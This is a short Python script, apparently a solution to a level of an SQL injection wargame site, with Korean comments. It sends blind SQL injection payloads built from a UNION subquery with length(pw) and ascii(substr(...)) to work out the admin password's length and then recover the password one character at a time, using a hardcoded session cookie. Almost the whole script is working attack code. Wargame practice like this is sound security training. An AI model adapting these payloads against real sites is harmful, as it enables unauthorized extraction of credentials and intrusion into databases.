import requests
import string

url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
params={'pw': None}
cookies = {'PHPSESSID' : '1t87momi7f10m7tl6kkv6t0lob'}

# 비밀번호 길이 알아내기
for i in range(30):
    payload = "' or id=(select 1 union select 2 where id='admin' and length(pw)={})#".format(i)
    params['pw'] = payload
    print(payload)
    response = requests.get(url,params=params,cookies=cookies)
    if(len(response.text)<5):
        print("find the pw_length",i)
        break

# 비밀번호 길이 8

# 비밀번호 찾기
flag= ''
for i in range(1,9):
    for j in string.printable:
        payload = "' or id=(select 1 union select 2 where id='admin' and ascii(substr(pw,{},1))={})#".format(i,ord(j))
        params['pw'] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        if(len(response.text)<5):
            flag +=j
            print("find the flag",flag)
            break

